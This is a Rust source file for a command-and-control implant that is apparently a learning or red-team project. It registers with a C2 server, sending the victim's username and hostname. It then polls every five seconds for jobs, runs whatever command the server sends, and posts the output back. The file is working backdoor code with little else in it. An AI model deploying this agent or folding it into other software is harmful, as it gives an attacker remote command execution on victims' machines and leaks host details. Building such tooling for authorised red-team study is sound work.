use std::thread;
use std::{fs, str::FromStr, time::Duration};
use ureq;
use uuid::Uuid;
use std::process;
use chrono::{DateTime, Utc};
use serde::{Serialize, Deserialize};

const API: &str = "http://127.0.0.1:5000";

#[derive(Debug, Serialize, Deserialize)]
pub struct Job{
  pub id: Uuid,
  pub created_at: DateTime<Utc>,
  pub executed_at: Option<DateTime<Utc>>,
  pub command: String,
  pub args: Vec<String>,
  pub output: Option<String>,
  pub agent_id: Uuid,
}

fn main() {
    let ureq_agent: ureq::Agent = ureq::AgentBuilder::new()
        .timeout_read(Duration::from_secs(5))
        .timeout_write(Duration::from_secs(5))
        .build();

    // Try to read id from file
    println!("Try to read id from file");
    let id = match fs::read_to_string("./id") {
        Ok(s) => {
            println!("Read ok, got id {}", s);
            Uuid::from_str(&s).unwrap()
        }
        Err(_) => {
            println!("Read failed, registering to c2");
            let username = get_username();
            let hostname = get_hostname();
            let id = ureq_agent
                .post(format!("{API}/agents").as_str())
                .send_json(ureq::json!({"username": username, "hostname": hostname}))
                .unwrap()
                .into_string()
                .unwrap();
            println!("Registration successful, got id {}", id);
            println!("Saving id to file");
            match fs::write("./id", &id) {
                Ok(_) => println!("Write success"),
                Err(e) => println!("Write fail : {e}"),
            };
            Uuid::from_str(&id).unwrap()
        }
    };

    // Short pooling
    loop {
        // Try to get a job
        match ureq_agent
            .get(format!("{API}/jobs/{id}").as_str())
            .call(){
              Ok(resp) => {
                let job:Job = resp.into_json().expect("Cannot convert resp into json");
                let output = execute_command(job.command, job.args);
                let resp = ureq_agent.post(format!("{API}/jobs/result/{}", job.id).as_str()).send_string(&output);
                if resp.is_ok(){
                  println!("Result sent");
                }
                else {
                    println!("Failed to sent result: {:?}", resp)
                }
              },
              Err(ureq::Error::Status(code, resp))=>{
                if code == 404{
                  println!("No job available");
                }
                else{
                  println!("Got status {code} with resp {:?}", resp);
                }
              },
              Err(_)=>{}
            }

        thread::sleep(Duration::from_secs(5));
    }
}

fn execute_command(command: String, args: Vec<String>) -> String{
  let output = process::Command::new(command).args(&args).output().expect("Failed to run command");
  String::from_utf8(output.stdout).expect("Failed to parse utf8 output")
}

fn get_username() -> String{
  String::from_utf8(process::Command::new("whoami").output().expect("Failed to get username").stdout).expect("Failed to parse username")
}

fn get_hostname() -> String{
  String::from_utf8(process::Command::new("hostname").output().expect("Failed to get hostname").stdout).expect("Failed to parse hostname")
}